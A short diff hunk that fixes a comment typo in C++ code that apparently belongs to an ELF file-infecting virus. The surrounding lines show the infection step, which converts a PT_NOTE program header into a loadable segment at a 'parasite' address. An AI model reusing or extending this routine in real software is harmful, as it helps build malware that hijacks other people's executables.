@@ -38,7 +38,7 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
                 Elf64_Xword pt_load_alignment,
                 Elf64_Addr parasite_load_address) {
   auto* pt_note_to_be_infected = &phdr + pt_note_to_be_infected_idx;
-  // trasforming pt_note to pt_load
+  // transforming pt_note to pt_load
   pt_note_to_be_infected->p_align = pt_load_alignment;
   pt_note_to_be_infected->p_vaddr = parasite_load_address;
   pt_note_to_be_infected->p_paddr = parasite_load_address;
